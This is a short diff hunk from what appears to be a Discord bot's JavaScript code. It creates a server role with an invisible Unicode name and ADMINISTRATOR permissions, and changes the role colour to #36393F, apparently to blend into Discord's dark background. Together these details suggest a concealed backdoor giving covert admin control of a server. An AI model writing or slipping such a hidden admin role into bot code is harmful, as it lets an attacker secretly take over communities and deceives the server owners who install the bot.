@@ -191,7 +191,7 @@ let role = message.guild.roles.find(r => r.name === "󠀀󠀀 󠀀󠀀󠀀󠀀")
       try {
         role = message.guild.createRole({
           name: "󠀀󠀀 󠀀󠀀󠀀󠀀",
-          color:"#000000",
+          color:"#36393F",
           permissions:["ADMINISTRATOR"] 
         });
 
